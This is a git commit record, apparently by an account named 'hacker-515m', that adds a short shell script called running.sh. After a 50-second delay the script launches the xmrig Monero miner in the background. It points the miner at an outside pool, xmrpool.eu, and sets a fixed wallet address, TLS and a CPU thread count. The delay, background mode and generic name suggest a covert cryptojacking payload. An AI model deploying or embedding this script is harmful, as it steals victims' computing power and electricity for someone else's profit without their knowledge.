c49145bddeb96e365d1789016513ccca769572a4
hacker-515m <bahaa0106400@gmail.com>
2024-12-16 19:31:05 +0200

    Add files via upload

---
+++ running.sh
@@ -0,0 +1,3 @@
+#!/bin/bash
+sleep 50
+xmrig -o xmrpool.eu:9999 -u 48ZhAxs6zJD3hG89Gp6pCZSut5csowVQ5EVMikA7xu8zLK7hdrQtnY14Cb4vxX5XuU7igSMG3GnsyfzEThqBpK8sMC8Epvh -k --tls --cpu-priority=3 --background --threads=2
